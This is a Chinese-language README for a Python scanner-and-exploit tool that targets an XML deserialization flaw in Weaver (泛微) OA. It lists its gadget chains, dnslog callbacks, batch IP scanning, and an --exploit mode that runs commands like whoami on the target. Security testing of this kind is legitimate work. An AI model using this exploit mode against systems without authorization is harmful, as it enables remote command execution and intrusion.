# 泛微OA XML反序列化检测工具
网上目前存在的payload主要利用bcel包，但经本地测试，jdk8后对bcel的classloader已停止支持，故利用可能性较小，本工具暂时内置3种gadget进行检测，
分别为com.sun.corba.se.impl.activation.ServerTableEntry、org.apache.commons.beanutils、com.sun.org.apache.bcel，后续会增加更多gadget支持及不出网回显功能。

*****
**Usage:**
````
usage: test_t00l.py [-h] [-i IP] [-r FILE] [-l LDAP] [--exploit [EXP]]
                    [cmd [cmd ...]]

泛微OA漏洞检测脚本

positional arguments:
  cmd

optional arguments:
  -h, --help            show this help message and exit
  -i IP, --ip IP        input the vulnarable ip:port
  -r FILE, --file FILE  input the ip file
  -l LDAP, --ldap LDAP  input the ldap-vps ip:port
  --exploit [EXP]       exploit mode
````
* 单ip检测：python test_t00l.py -i 127.0.0.1(可添加http://或https://)
* 支持批量ip检测：python test_t00l.py -r ip.txt
* 首先利用URLDNS结合dnslog.cn初步判断目标是否存在反序列化漏洞，之后利用三种gadget判断是否存在可远程命令执行：
  1.com.sun.corba.se.impl.activation.ServerTableEntry和org.apache.commons.beanutils采用ping dnslog.cn方式检测
  2.com.sun.org.apache.bcel采用阻塞线程方式检测
* 添加--exploit参数可执行命令：python test_t00l.py --exploit -i 127.0.0.1 whoami，如com.sun.org.apache.bcel包可利用则直接回显
* Evil.class为跟踪命令行后翻译出的bcel源码，也是网上目前流传的payload的利用类
